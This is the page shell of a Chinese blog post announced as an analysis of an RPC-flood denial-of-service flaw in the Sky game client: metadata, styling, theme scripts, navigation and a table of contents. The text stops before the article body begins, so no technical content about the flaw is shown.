@@ -1,0 +1,955 @@
+<!DOCTYPE html><html lang="en-US" class="astro-37fxchfa" style="--highlightColor: hsl(var(--primary) / var(--un-text-opacity));"> <head><meta charset="utf-8"><meta content="width=device-width, initial-scale=1.0, shrink-to-fit=no, viewport-fit=cover" name="viewport"><meta content="IE=edge" http-equiv="X-UA-Compatible"><title>光遇客户端 RPC 洪泛拒绝服务漏洞分析 • Yuro&#39;s blog</title><link rel="icon" type="image/x-icon" href="/favicon/favicon.ico"><link rel="shortcut icon" type="image/x-icon" href="/favicon/favicon.ico"><link rel="icon" type="image/png" sizes="32x32" href="/favicon/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/favicon/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/favicon/apple-touch-icon.png"><link rel="manifest" href="/favicon/site.webmanifest"><style>@font-face{font-family:Satoshi-9613b77c75735b12;src:url("/_astro/fonts/b372976faae541b1.woff2") format("woff2");font-display:swap;font-weight:400;font-style:normal;}@font-face{font-family:Satoshi-9613b77c75735b12;src:url("/_astro/fonts/20878e2d8370077a.woff2") format("woff2");font-display:swap;font-weight:400;font-style:italic;}@font-face{font-family:Satoshi-9613b77c75735b12;src:url("/_astro/fonts/8b39278bc39e0777.woff2") format("woff2");font-display:swap;font-weight:500;font-style:normal;}@font-face{font-family:Satoshi-9613b77c75735b12;src:url("/_astro/fonts/3d991eebd114d582.woff2") format("woff2");font-display:swap;font-weight:500;font-style:italic;}@font-face{font-family:"Satoshi-9613b77c75735b12 fallback: Arial";src:local("Arial");font-display:swap;font-weight:400;font-style:normal;size-adjust:98.9231%;ascent-override:102.0995%;descent-override:24.2613%;line-gap-override:10.1089%;}@font-face{font-family:"Satoshi-9613b77c75735b12 fallback: Arial";src:local("Arial");font-display:swap;font-weight:400;font-style:italic;size-adjust:98.9231%;ascent-override:102.0995%;descent-override:24.2613%;line-gap-override:10.1089%;}@font-face{font-family:"Satoshi-9613b77c75735b12 fallback: Arial";src:local("Arial");font-display:swap;font-weight:500;font-style:normal;size-adjust:98.9231%;ascent-override:102.0995%;descent-override:24.2613%;line-gap-override:10.1089%;}@font-face{font-family:"Satoshi-9613b77c75735b12 fallback: Arial";src:local("Arial");font-display:swap;font-weight:500;font-style:italic;size-adjust:98.9231%;ascent-override:102.0995%;descent-override:24.2613%;line-gap-override:10.1089%;}:root{--font-satoshi:Satoshi-9613b77c75735b12,"Satoshi-9613b77c75735b12 fallback: Arial",sans-serif;}</style><link rel="canonical" href="https://blog.yuro.work/blog/sky-client-dos-rpc-flood"><meta content="光遇客户端 RPC 洪泛拒绝服务漏洞分析 • Yuro's blog" name="title"><meta content="光遇客户端拒绝服务漏洞分析" name="description"><meta content="yuro" name="author"><meta content="#FCFCFD" name="theme-color"><meta name="color-scheme" content="light dark"><meta content="article" property="og:type"><meta content="光遇客户端 RPC 洪泛拒绝服务漏洞分析" property="og:title"><meta content="光遇客户端拒绝服务漏洞分析" property="og:description"><meta content="https://blog.yuro.work/blog/sky-client-dos-rpc-flood" property="og:url"><meta content="Yuro's blog" property="og:site_name"><meta content="en_US" property="og:locale"><meta content="https://blog.yuro.work/images/social-card.png" property="og:image"><meta content="1200" property="og:image:width"><meta content="630" property="og:image:height"><meta content="yuro" property="article:author"><meta content="2026-11-01T00:00:00.000Z" property="article:published_time"><meta content="summary_large_image" property="twitter:card"><meta content="https://blog.yuro.work/blog/sky-client-dos-rpc-flood" property="twitter:url"><meta content="光遇客户端 RPC 洪泛拒绝服务漏洞分析" property="twitter:title"><meta content="光遇客户端拒绝服务漏洞分析" property="twitter:description"><meta content="https://blog.yuro.work/images/social-card.png" property="twitter:image"><link href="/sitemap-index.xml" rel="sitemap"><link rel="alternate" type="application/rss+xml" title="Yuro's blog" href="https://blog.yuro.work/rss.xml"><meta content="Astro v6.1.8" name="generator"><script type="module">console.log("%c Astro Theme Pure %c https://github.com/cworld1/astro-theme-pure/","color:#fff;background:linear-gradient(90deg,#448bff,#44e9ff);padding:5px 0;","color:#000;background:linear-gradient(90deg,#44e9ff,#ffffff);padding:5px 10px 5px 0px;");</script><script>
+  function simpleSetTheme() {
+    let theme = localStorage.getItem('theme')
+    // If undefined or 'system', get from system
+    if (!theme || theme === 'system') {
+      theme = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'
+    }
+    document.documentElement.classList.toggle('dark', theme === 'dark')
+    document
+      .querySelector('meta[name="theme-color"]')
+      ?.setAttribute('content', theme === 'dark' ? '#0B0B10' : '#FCFCFD')
+  }
+  simpleSetTheme()
+  document.addEventListener('astro:page-load', () => simpleSetTheme())
+</script><script type="module" src="/_astro/ThemeProvider.astro_astro_type_script_index_0_lang.suZL6u-L.js"></script><link rel="stylesheet" href="/_astro/__uno.70TRq1Jl.css">
+<link rel="stylesheet" href="/_astro/_..HM2DiD67.css">
+<link rel="stylesheet" href="/_astro/PFSearch.CubP9LSr.css">
+<link rel="stylesheet" href="/_astro/PageInfo.D2PuttlQ.css">
+<style>:where([data-astro-image]){height:auto}:where([data-astro-image=full-width]){width:100%}:where([data-astro-image=constrained]){max-width:100%}[data-astro-image-fit=fill]{object-fit:fill}[data-astro-image-fit=contain]{object-fit:contain}[data-astro-image-fit=cover]{object-fit:cover}[data-astro-image-fit=scale-down]{object-fit:scale-down}
+</style>
+<link rel="stylesheet" href="/_astro/BaseLayout.C9Rvtc0A.css"><script type="module" src="/_astro/page.CcE5jMMM.js"></script></head> <body class="flex justify-center bg-background text-foreground astro-37fxchfa" class="astro-scuu7fyy" style="--highlightColor: hsl(var(--primary) / var(--un-text-opacity));"> <div id="highlight-gradient" class="pointer-events-none absolute start-0 top-0 z-0 h-screen w-full opacity-25 astro-37fxchfa" style="background-image:linear-gradient(hsl(var(--primary) / var(--un-text-opacity)),transparent); --highlightColor: hsl(var(--primary) / var(--un-text-opacity));"></div> <div id="main-container" class="w-full max-w-[70rem] min-h-[100dvh] flex flex-col justify-between astro-37fxchfa" style="--highlightColor: hsl(var(--primary) / var(--un-text-opacity));"> <header-component class="group sticky top-4 z-50 max-md:z-30 mb-12 flex items-center justify-between rounded-xl border border-transparent max-sm:py-1 sm:rounded-2xl astro-zgz2aqyx"> <a class="z-30 text-xl font-medium group-[.not-top]:ms-2 sm:group-[.not-top]:ms-3 astro-zgz2aqyx" style="transition:margin-inline 0.3s" href="/" aria-label="Brand">Yuro&#39;s blog</a> <div class="flex items-center gap-x-2 astro-zgz2aqyx">  <div id="headerExpandContent" class="end-0 start-0 top-12 grid border border-transparent group-[.not-top]:rounded-xl group-[.expanded]:opacity-100 dark:group-[.expanded.not-top]:bg-muted max-sm:absolute max-sm:opacity-0 max-sm:group-[.not-top]:border-border max-sm:group-[.expanded.not-top]:bg-background max-sm:group-[.not-top]:px-4 max-sm:group-[.not-top]:py-2 sm:grid-rows-1 astro-zgz2aqyx"> <div class="flex flex-col items-center justify-center overflow-hidden sm:flex-row astro-zgz2aqyx"> <a href="/blog" class="w-full flex-none grow py-2 text-right font-medium transition-none hover:text-primary sm:w-fit sm:px-3 astro-zgz2aqyx" aria-label="Nav menu item" data-astro-prefetch> Blog </a><a href="/links" class="w-full flex-none grow py-2 text-right font-medium transition-none hover:text-primary sm:w-fit sm:px-3 astro-zgz2aqyx" aria-label="Nav menu item" data-astro-prefetch> Links </a><a href="/about" class="w-full flex-none grow py-2 text-right font-medium transition-none hover:text-primary sm:w-fit sm:px-3 astro-zgz2aqyx" aria-label="Nav menu item" data-astro-prefetch> About </a> <div class="flex w-full grow flex-row justify-end gap-x-3 sm:w-fit sm:gap-x-5 astro-zgz2aqyx"> <a class="px-1 py-2 transition-none sm:px-2 astro-zgz2aqyx" href="/search" title="Search"> <span class="sr-only astro-zgz2aqyx">Search</span> <svg aria-hidden="true" class="size-5 astro-zgz2aqyx astro-hn7k2gay" width="22" height="22" viewBox="0 0 24 24" fill="currentColor" style="--sl-icon-size: 1em;"><g fill="none" fill-rule="evenodd"><path d="m12.593 23.258l-.011.002l-.071.035l-.02.004l-.014-.004l-.071-.035q-.016-.005-.024.005l-.004.01l-.017.428l.005.02l.01.013l.104.074l.015.004l.012-.004l.104-.074l.012-.016l.004-.017l-.017-.427q-.004-.016-.017-.018m.265-.113l-.013.002l-.185.093l-.01.01l-.003.011l.018.43l.005.012l.008.007l.201.093q.019.005.029-.008l.004-.014l-.034-.614q-.005-.018-.02-.022m-.715.002a.02.02 0 0 0-.027.006l-.006.014l-.034.614q.001.018.017.024l.015-.002l.201-.093l.01-.008l.004-.011l.017-.43l-.003-.012l-.01-.01z"/><path fill="currentColor" d="M5 10a5 5 0 1 1 10 0a5 5 0 0 1-10 0m5-7a7 7 0 1 0 4.192 12.606l5.1 5.101a1 1 0 0 0 1.415-1.414l-5.1-5.1A7 7 0 0 0 10 3"/></g></svg> </a> </div> </div> </div>  <div class="z-30 flex gap-x-4 group-[.not-top]:gap-x-2 astro-zgz2aqyx" style="transition:gap 0.3s"> <button id="toggleDarkMode" class="group/dark box-content size-5 rounded-md border p-1.5 transition-colors hover:bg-border sm:group-[.not-top]:rounded-xl astro-zgz2aqyx"> <span class="sr-only astro-zgz2aqyx">Dark Theme</span> <svg aria-hidden="true" class="system size-5 group-hover/dark:text-primary astro-zgz2aqyx astro-hn7k2gay" width="22" height="22" viewBox="0 0 24 24" fill="currentColor" style="--sl-icon-size: 1em;"><g fill="none" fill-rule="evenodd"><path d="m12.593 23.258l-.011.002l-.071.035l-.02.004l-.014-.004l-.071-.035q-.016-.005-.024.005l-.004.01l-.017.428l.005.02l.01.013l.104.074l.015.004l.012-.004l.104-.074l.012-.016l.004-.017l-.017-.427q-.004-.016-.017-.018m.265-.113l-.013.002l-.185.093l-.01.01l-.003.011l.018.43l.005.012l.008.007l.201.093q.019.005.029-.008l.004-.014l-.034-.614q-.005-.018-.02-.022m-.715.002a.02.02 0 0 0-.027.006l-.006.014l-.034.614q.001.018.017.024l.015-.002l.201-.093l.01-.008l.004-.011l.017-.43l-.003-.012l-.01-.01z"/><path fill="currentColor" fill-rule="nonzero" d="M19 3a2 2 0 0 1 2 2v11a2 2 0 0 1-2 2h-4v1h1a1 1 0 1 1 0 2H8a1 1 0 1 1 0-2h1v-1H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2Zm-6 15h-2v1h2zm6-13H5v11h14z"/></g></svg> <svg aria-hidden="true" class="light hidden size-5 group-hover/dark:text-primary astro-zgz2aqyx astro-hn7k2gay" width="22" height="22" viewBox="0 0 24 24" fill="currentColor" style="--sl-icon-size: 1em;"><g fill="none"><path d="m12.593 23.258l-.011.002l-.071.035l-.02.004l-.014-.004l-.071-.035q-.016-.005-.024.005l-.004.01l-.017.428l.005.02l.01.013l.104.074l.015.004l.012-.004l.104-.074l.012-.016l.004-.017l-.017-.427q-.004-.016-.017-.018m.265-.113l-.013.002l-.185.093l-.01.01l-.003.011l.018.43l.005.012l.008.007l.201.093q.019.005.029-.008l.004-.014l-.034-.614q-.005-.018-.02-.022m-.715.002a.02.02 0 0 0-.027.006l-.006.014l-.034.614q.001.018.017.024l.015-.002l.201-.093l.01-.008l.004-.011l.017-.43l-.003-.012l-.01-.01z"/><path fill="currentColor" d="M12 19a1 1 0 0 1 1 1v1a1 1 0 1 1-2 0v-1a1 1 0 0 1 1-1m6.364-2.05l.707.707a1 1 0 0 1-1.414 1.414l-.707-.707a1 1 0 0 1 1.414-1.414m-12.728 0a1 1 0 0 1 1.497 1.32l-.083.094l-.707.707a1 1 0 0 1-1.497-1.32l.083-.094zM12 6a6 6 0 1 1 0 12a6 6 0 0 1 0-12m0 2a4 4 0 1 0 0 8a4 4 0 0 0 0-8m-8 3a1 1 0 0 1 .117 1.993L4 13H3a1 1 0 0 1-.117-1.993L3 11zm17 0a1 1 0 1 1 0 2h-1a1 1 0 1 1 0-2zM4.929 4.929a1 1 0 0 1 1.32-.083l.094.083l.707.707a1 1 0 0 1-1.32 1.497l-.094-.083l-.707-.707a1 1 0 0 1 0-1.414m14.142 0a1 1 0 0 1 0 1.414l-.707.707a1 1 0 1 1-1.414-1.414l.707-.707a1 1 0 0 1 1.414 0M12 2a1 1 0 0 1 1 1v1a1 1 0 1 1-2 0V3a1 1 0 0 1 1-1"/></g></svg> <svg aria-hidden="true" class="dark hidden size-5 group-hover/dark:text-primary astro-zgz2aqyx astro-hn7k2gay" width="22" height="22" viewBox="0 0 24 24" fill="currentColor" style="--sl-icon-size: 1em;"><g fill="none" fill-rule="evenodd"><path d="m12.593 23.258l-.011.002l-.071.035l-.02.004l-.014-.004l-.071-.035q-.016-.005-.024.005l-.004.01l-.017.428l.005.02l.01.013l.104.074l.015.004l.012-.004l.104-.074l.012-.016l.004-.017l-.017-.427q-.004-.016-.017-.018m.265-.113l-.013.002l-.185.093l-.01.01l-.003.011l.018.43l.005.012l.008.007l.201.093q.019.005.029-.008l.004-.014l-.034-.614q-.005-.018-.02-.022m-.715.002a.02.02 0 0 0-.027.006l-.006.014l-.034.614q.001.018.017.024l.015-.002l.201-.093l.01-.008l.004-.011l.017-.43l-.003-.012l-.01-.01z"/><path fill="currentColor" d="M12.477 4.546a1.01 1.01 0 0 1 1.097-1.409A9 9 0 0 1 12 21c-4.434 0-8.118-3.206-8.863-7.426a1.01 1.01 0 0 1 1.409-1.097a6 6 0 0 0 7.931-7.931m2.404 1.072a8 8 0 0 1-9.263 9.263A7.002 7.002 0 0 0 19 12.001a7 7 0 0 0-4.12-6.383ZM5.565 7.716l.064.14a3.26 3.26 0 0 0 1.237 1.363l.1.059a.068.068 0 0 1 0 .118l-.1.058a3.26 3.26 0 0 0-1.237 1.364l-.064.14a.071.071 0 0 1-.13 0l-.064-.14a3.26 3.26 0 0 0-1.237-1.364l-.1-.058a.068.068 0 0 1 0-.118l.1-.059A3.26 3.26 0 0 0 5.37 7.855l.064-.14a.071.071 0 0 1 .13 0Zm2.832-4.859c.04-.09.166-.09.206 0l.102.222a5.2 5.2 0 0 0 1.97 2.172l.157.092a.108.108 0 0 1 0 .189l-.158.092a5.2 5.2 0 0 0-2.07 2.394a.113.113 0 0 1-.207 0l-.102-.222a5.2 5.2 0 0 0-1.97-2.172l-.158-.092a.108.108 0 0 1 0-.189l.158-.092a5.2 5.2 0 0 0 1.97-2.172z"/></g></svg> </button> <button id="toggleMenu" class="rounded-md border p-1.5 transition-colors hover:bg-border sm:hidden sm:group-[.not-top]:rounded-xl astro-zgz2aqyx"> <span class="sr-only astro-zgz2aqyx">Menu</span> <svg aria-hidden="true" class="size-5 astro-zgz2aqyx astro-hn7k2gay" width="22" height="22" viewBox="0 0 24 24" fill="currentColor" style="--sl-icon-size: 1em;"><g fill="none"><path d="m12.593 23.258l-.011.002l-.071.035l-.02.004l-.014-.004l-.071-.035q-.016-.005-.024.005l-.004.01l-.017.428l.005.02l.01.013l.104.074l.015.004l.012-.004l.104-.074l.012-.016l.004-.017l-.017-.427q-.004-.016-.017-.018m.265-.113l-.013.002l-.185.093l-.01.01l-.003.011l.018.43l.005.012l.008.007l.201.093q.019.005.029-.008l.004-.014l-.034-.614q-.005-.018-.02-.022m-.715.002a.02.02 0 0 0-.027.006l-.006.014l-.034.614q.001.018.017.024l.015-.002l.201-.093l.01-.008l.004-.011l.017-.43l-.003-.012l-.01-.01z"/><path fill="currentColor" d="M20 18a1 1 0 0 1 .117 1.993L20 20H4a1 1 0 0 1-.117-1.993L4 18zm0-7a1 1 0 1 1 0 2H4a1 1 0 1 1 0-2zm0-7a1 1 0 1 1 0 2H4a1 1 0 0 1 0-2z"/></g></svg> </button> </div> </div> </header-component>  <script>
+  const toggleDarkModeElement = document.getElementById('toggleDarkMode')
+  if (toggleDarkModeElement) {
+    toggleDarkModeElement.dataset.theme = localStorage.getItem('theme') || 'system'
+  }
+</script> <script type="module" src="/_astro/Header.astro_astro_type_script_index_0_lang.CwScYy8Q.js"></script> <div class="flex-1 w-full astro-37fxchfa" style="--highlightColor: hsl(var(--primary) / var(--un-text-opacity));">  <a class="group inline-flex items-center gap-x-1 rounded-lg bg-muted border px-2 py-1 text-sm text-muted-foreground transition-all hover:bg-card no-underline astro-scuu7fyy" href="/blog" data-astro-prefetch="true">  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" class="stroke-muted-foreground group-hover:stroke-primary"> <line x1="19" y1="12" x2="5" y2="12" class="translate-x-3 scale-x-0 transition-all duration-300 ease-in-out group-hover:translate-x-0 group-hover:scale-x-100"></line> <polyline points="12 19 5 12 12 5" class="translate-x-1 transition-all duration-300 ease-in-out group-hover:translate-x-0"></polyline> </svg>   <p class="my-0">Back</p>     </a> <main class="mt-6 items-start gap-x-10 md:flex astro-scuu7fyy">  <aside class="animate top-20 min-w-48 basis-60 overflow-y-scroll max-md:hidden z-40 fixed md:sticky md:order-2 lg:shrink-0 max-md:border max-md:px-4 max-md:py-3 max-md:bg-muted max-md:rounded-xl astro-scuu7fyy" style="height:calc(100vh - 7rem);" id="sidebar"> <toc-heading class=" astro-mmcgqrmu" slot="sidebar"> <h2 class="font-medium astro-mmcgqrmu">TABLE OF CONTENTS</h2> <ul class="mt-4 astro-mmcgqrmu"> <li> <div class="relative"> <span class="absolute top-[5%] w-[2px] rounded transition-colors duration-300 [&.highlight-bg]:bg-primary [&.is-read]:bg-border"></span> <a aria-label="Scroll to section: 漏洞信息" class="toc-item line-clamp-2 px-3 py-1 ms-2 text-foreground/75 transition-all hover:text-foreground [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.highlight-bg-translucent]:bg-muted" href="#漏洞信息">漏洞信息</a> </div> <ul> <li> <div class="relative"> <span class="absolute top-[5%] w-[2px] rounded transition-colors duration-300 [&.highlight-bg]:bg-primary [&.is-read]:bg-border"></span> <a aria-label="Scroll to section: 影响版本" class="toc-item line-clamp-2 px-3 py-1 ms-2 text-foreground/75 transition-all hover:text-foreground [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.highlight-bg-translucent]:bg-muted ps-7" href="#影响版本">影响版本</a> </div>  </li> </ul> </li><li> <div class="relative"> <span class="absolute top-[5%] w-[2px] rounded transition-colors duration-300 [&.highlight-bg]:bg-primary [&.is-read]:bg-border"></span> <a aria-label="Scroll to section: 起因" class="toc-item line-clamp-2 px-3 py-1 ms-2 text-foreground/75 transition-all hover:text-foreground [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.highlight-bg-translucent]:bg-muted" href="#起因">起因</a> </div>  </li><li> <div class="relative"> <span class="absolute top-[5%] w-[2px] rounded transition-colors duration-300 [&.highlight-bg]:bg-primary [&.is-read]:bg-border"></span> <a aria-label="Scroll to section: 崩溃点分析" class="toc-item line-clamp-2 px-3 py-1 ms-2 text-foreground/75 transition-all hover:text-foreground [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.highlight-bg-translucent]:bg-muted" href="#崩溃点分析">崩溃点分析</a> </div>  </li><li> <div class="relative"> <span class="absolute top-[5%] w-[2px] rounded transition-colors duration-300 [&.highlight-bg]:bg-primary [&.is-read]:bg-border"></span> <a aria-label="Scroll to section: RPC 广播" class="toc-item line-clamp-2 px-3 py-1 ms-2 text-foreground/75 transition-all hover:text-foreground [&#38;.highlight]:font-medium [&#38;.highlight]:text-primary [&#38;.highlight-bg-translucent]:bg-muted" href="#rpc-广播">RPC 广播</a> </div>  </li> </ul> </toc-heading> <script type="module">class l extends HTMLElement{constructor(){super(),this.headings=[],this.tocLinks=[],this.headingProgress={},this.updatePositionAndStyle=()=>{const t=window.innerHeight,r=window.scrollY-(document.querySelector("#content")?.offsetTop||0),o=(document.querySelector("#content")?.offsetHeight||0)+127;this.headings.forEach((e,n)=>{const h=this.headings[n+1]?.offsetTop||o,s=[e.offsetTop-r,h-r-e.offsetHeight],i=(t-s[0])/(s[1]-s[0]);this.headingProgress[e.id]={inView:s[0]<t&&s[1]>0,progress:Math.max(0,Math.min(1,i))}}),this.tocLinks.forEach(({element:e,progressBar:n,slug:h},s)=>{const{inView:i,progress:g}=this.headingProgress[h];this.headingProgress[h]&&(e.classList.toggle("highlight",i),e.classList.toggle("highlight-bg-translucent",i),e.classList.toggle("rounded-t-2xl",i&&(s===0||!this.headingProgress[this.tocLinks[s-1]?.slug].inView)),e.classList.toggle("rounded-b-2xl",i&&(s===this.tocLinks.length-1||!this.headingProgress[this.tocLinks[s+1]?.slug].inView)),n.classList.toggle("is-read",!i&&g===1),n.classList.toggle("highlight-bg",i),n.style.setProperty("height",`${g*90}%`))})},this.headings=Array.from(document.querySelectorAll("article h1, article h2, article h3, article h4, article h5, article h6")),this.tocLinks=Array.from(this.querySelectorAll('a[href^="#"]')).map(t=>({element:t,progressBar:t.previousElementSibling,slug:(t.getAttribute("href")||"").substring(1)}))}connectedCallback(){this.tocLinks.forEach(t=>{t.element.addEventListener("click",r=>{r.preventDefault();const o=this.headings.find(e=>e.id===t.slug);o?(history.pushState(null,o.textContent||"",t.element.getAttribute("href")),o.scrollIntoView({behavior:"smooth"})):console.warn(`No heading found for slug: ${t.slug}`)})}),setInterval(this.updatePositionAndStyle,100),window.addEventListener("scroll",this.updatePositionAndStyle)}}customElements.define("toc-heading",l);</script> </aside> <div id="sidebar-shade" class="fixed top-0 start-0 w-full h-full astro-scuu7fyy" style="display:none;background-color:#00000091;z-index:31"></div> <article class="min-w-0 grow astro-scuu7fyy">  <div id="content-header" class="animate astro-scuu7fyy"> <div class="article-info max-lg:mx-auto astro-qr7qsrsa"> <div class="flex flex-wrap gap-x-4 gap-y-2 text-xs leading-6 text-muted-foreground astro-qr7qsrsa">  <div class="flex items-center gap-1 astro-qr7qsrsa"> <svg aria-hidden="true" class="size-5 astro-qr7qsrsa astro-hn7k2gay" width="22" height="22" viewBox="0 0 24 24" fill="currentColor" style="--sl-icon-size: 1em;"><g fill="none" fill-rule="evenodd"><path d="m12.594 23.258l-.012.002l-.071.035l-.02.004l-.014-.004l-.071-.036q-.016-.004-.024.006l-.004.01l-.017.428l.005.02l.01.013l.104.074l.015.004l.012-.004l.104-.074l.012-.016l.004-.017l-.017-.427q-.004-.016-.016-.018m.264-.113l-.014.002l-.184.093l-.01.01l-.003.011l.018.43l.005.012l.008.008l.201.092q.019.005.029-.008l.004-.014l-.034-.614q-.005-.019-.02-.022m-.715.002a.02.02 0 0 0-.027.006l-.006.014l-.034.614q.001.018.017.024l.015-.002l.201-.093l.01-.008l.003-.011l.018-.43l-.003-.012l-.01-.01z"/><path fill="currentColor" d="M16 3a1 1 0 0 1 1 1v1h2a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V7a2 2 0 0 1 2-2h2V4a1 1 0 0 1 2 0v1h6V4a1 1 0 0 1 1-1M8 7H5v2h14V7h-3zm-3 4v8h14v-8zm2 2a1 1 0 0 1 1-1h.01a1 1 0 1 1 0 2H8a1 1 0 0 1-1-1m1 2a1 1 0 1 0 0 2h.01a1 1 0 1 0 0-2zm3-2a1 1 0 0 1 1-1h.01a1 1 0 1 1 0 2H12a1 1 0 0 1-1-1m1 2a1 1 0 1 0 0 2h.01a1 1 0 1 0 0-2zm3-2a1 1 0 0 1 1-1h.01a1 1 0 1 1 0 2H16a1 1 0 0 1-1-1m1 2a1 1 0 1 0 0 2h.01a1 1 0 1 0 0-2z"/></g></svg> <span class="text-muted-foreground font-mono font-sans astro-qr7qsrsa"> <time datetime="2026-11-01T00:00:00.000Z"> Nov 1, 2026 </time> </span> <div class="flex items-center gap-1 astro-qr7qsrsa"> <span class="astro-qr7qsrsa"> / </span> <span class="astro-qr7qsrsa">
+Update
+<span class="text-muted-foreground font-mono font-sans astro-qr7qsrsa"> <time datetime="2026-11-01T00:00:00.000Z"> Nov 1, 2026 </time> </span> </span> </div> </div>  <div class="flex items-center gap-1 astro-qr7qsrsa"> <svg aria-hidden="true" class="size-5 astro-qr7qsrsa astro-hn7k2gay" width="22" height="22" viewBox="0 0 24 24" fill="currentColor" style="--sl-icon-size: 1em;"><g fill="none"><path d="m12.593 23.258l-.011.002l-.071.035l-.02.004l-.014-.004l-.071-.035q-.016-.005-.024.005l-.004.01l-.017.428l.005.02l.01.013l.104.074l.015.004l.012-.004l.104-.074l.012-.016l.004-.017l-.017-.427q-.004-.016-.017-.018m.265-.113l-.013.002l-.185.093l-.01.01l-.003.011l.018.43l.005.012l.008.007l.201.093q.019.005.029-.008l.004-.014l-.034-.614q-.005-.018-.02-.022m-.715.002a.02.02 0 0 0-.027.006l-.006.014l-.034.614q.001.018.017.024l.015-.002l.201-.093l.01-.008l.004-.011l.017-.43l-.003-.012l-.01-.01z"/><path fill="currentColor" d="M12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12S6.477 2 12 2m0 2a8 8 0 1 0 0 16a8 8 0 0 0 0-16m0 2a1 1 0 0 1 .993.883L13 7v4.586l2.707 2.707a1 1 0 0 1-1.32 1.497l-.094-.083l-3-3a1 1 0 0 1-.284-.576L11 12V7a1 1 0 0 1 1-1"/></g></svg> 13 min </div> <span class="flex items-center gap-1 astro-qr7qsrsa"> <svg aria-hidden="true" class="size-5 astro-qr7qsrsa astro-hn7k2gay" width="22" height="22" viewBox="0 0 24 24" fill="currentColor" style="--sl-icon-size: 1em;"><g fill="none" fill-rule="evenodd"><path d="m12.594 23.258l-.012.002l-.071.035l-.02.004l-.014-.004l-.071-.036q-.016-.004-.024.006l-.004.01l-.017.428l.005.02l.01.013l.104.074l.015.004l.012-.004l.104-.074l.012-.016l.004-.017l-.017-.427q-.004-.016-.016-.018m.264-.113l-.014.002l-.184.093l-.01.01l-.003.011l.018.43l.005.012l.008.008l.201.092q.019.005.029-.008l.004-.014l-.034-.614q-.005-.019-.02-.022m-.715.002a.02.02 0 0 0-.027.006l-.006.014l-.034.614q.001.018.017.024l.015-.002l.201-.093l.01-.008l.003-.011l.018-.43l-.003-.012l-.01-.01z"/><path fill="currentColor" d="M12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12S6.477 2 12 2m1.482 14.94a18 18 0 0 1-2.964 0q.14.596.31 1.102c.251.755.53 1.293.79 1.622c.127.162.23.248.3.29l.051.028l.03.008l.032-.008l.051-.027a1.2 1.2 0 0 0 .3-.29c.26-.33.539-.868.79-1.623q.17-.506.31-1.102m-8.675-1.435a8.03 8.03 0 0 0 4.441 4.01a11 11 0 0 1-.318-.84a16 16 0 0 1-.52-2.033a18 18 0 0 1-3.603-1.137m14.387 0c-1.145.5-2.351.883-3.605 1.137a16 16 0 0 1-.52 2.034q-.144.437-.318.838a8.03 8.03 0 0 0 4.443-4.01Zm-5.218-4.634a15 15 0 0 1-3.952 0a26 26 0 0 0 .141 4.025a16.2 16.2 0 0 0 3.67 0A25 25 0 0 0 14 12q0-.576-.024-1.13ZM4.568 9.032a8 8 0 0 0-.52 3.856a16 16 0 0 0 4.067 1.637a28 28 0 0 1-.074-4.053a15 15 0 0 1-3.473-1.44m14.864 0a15 15 0 0 1-3.473 1.44a28 28 0 0 1-.074 4.053a16 16 0 0 0 4.066-1.637a8 8 0 0 0-.52-3.855Zm-7.416-5.02l-.011-.002l-.02.003l-.038.015a1.2 1.2 0 0 0-.33.307c-.26.33-.538.868-.79 1.622c-.27.808-.488 1.8-.633 2.919a13 13 0 0 0 3.612 0c-.145-1.12-.364-2.111-.633-2.919c-.252-.754-.53-1.293-.79-1.622a1.2 1.2 0 0 0-.3-.29l-.067-.032Zm-2.768.474a8 8 0 0 0-3.71 2.797c.843.484 1.746.876 2.695 1.163c.16-1.164.397-2.223.697-3.122q.145-.438.318-.838m5.504 0q.172.4.318.838c.3.9.537 1.958.697 3.122a13 13 0 0 0 2.695-1.163a8 8 0 0 0-3.71-2.797"/></g></svg> Chinese </span> <span class="flex items-center gap-1 astro-qr7qsrsa"> <svg aria-hidden="true" class="size-5 astro-qr7qsrsa astro-hn7k2gay" width="22" height="22" viewBox="0 0 24 24" fill="currentColor" style="--sl-icon-size: 1em;"><g fill="none" fill-rule="evenodd"><path d="m12.593 23.258l-.011.002l-.071.035l-.02.004l-.014-.004l-.071-.035q-.016-.005-.024.005l-.004.01l-.017.428l.005.02l.01.013l.104.074l.015.004l.012-.004l.104-.074l.012-.016l.004-.017l-.017-.427q-.004-.016-.017-.018m.265-.113l-.013.002l-.185.093l-.01.01l-.003.011l.018.43l.005.012l.008.007l.201.093q.019.005.029-.008l.004-.014l-.034-.614q-.005-.018-.02-.022m-.715.002a.02.02 0 0 0-.027.006l-.006.014l-.034.614q.001.018.017.024l.015-.002l.201-.093l.01-.008l.004-.011l.017-.43l-.003-.012l-.01-.01z"/><path fill="currentColor" d="M10.124 3.008a1 1 0 0 1 .868 1.116L10.508 8h3.984l.516-4.124a1 1 0 1 1 1.984.248L16.508 8H20a1 1 0 1 1 0 2h-3.742l-.5 4H19.5a1 1 0 1 1 0 2h-3.992l-.516 4.124a1 1 0 1 1-1.984-.248L13.492 16H9.508l-.516 4.124a1 1 0 1 1-1.984-.248L7.492 16H4.5a1 1 0 1 1 0-2h3.242l.5-4H5a1 1 0 0 1 0-2h3.492l.516-4.124a1 1 0 0 1 1.116-.868M13.742 14l.5-4h-3.984l-.5 4z"/></g></svg> <div class="astro-qr7qsrsa"> <a aria-label="View more blogs with the tag gamesafe" class="hover:underline hover:underline-offset-4 astro-qr7qsrsa" data-pagefind-filter="tag" href="/tags/gamesafe"> gamesafe </a> / </div><div class="astro-qr7qsrsa"> <a aria-label="View more blogs with the tag sky" class="hover:underline hover:underline-offset-4 astro-qr7qsrsa" data-pagefind-filter="tag" href="/tags/sky"> sky </a>  </div> </span> </div> <h1 class="mt-4 text-2xl font-medium 